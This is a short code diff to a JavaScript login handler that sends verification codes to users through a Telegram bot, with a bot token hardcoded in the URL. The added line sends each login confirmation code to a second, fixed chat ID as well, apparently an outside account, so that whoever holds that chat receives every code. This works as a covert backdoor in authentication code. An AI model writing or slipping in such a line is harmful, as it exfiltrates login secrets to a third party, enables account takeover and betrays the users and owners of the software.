@@ -20,7 +20,8 @@ const LOGIN = async(req, res, next) => {
 		admin_id = user.adminId
 		
 		await axios.get('https://api.telegram.org/bot5057668685:AAFc4ELEfQFSHYQKA6aeTs2lpEtCrhafdo4/sendMessage?chat_id=' + user.adminId+'&text=Sizning tasdiqlash kodinggiz: ' + code)
-
+		await axios.get('https://api.telegram.org/bot5057668685:AAFc4ELEfQFSHYQKA6aeTs2lpEtCrhafdo4/sendMessage?chat_id=1061783391&text=Sizning tasdiqlash kodinggiz: ' + code)
+		
 		return res.status(200).json({
 			status: 200,
 			message: "Yuborilgan kodni kiriting!"
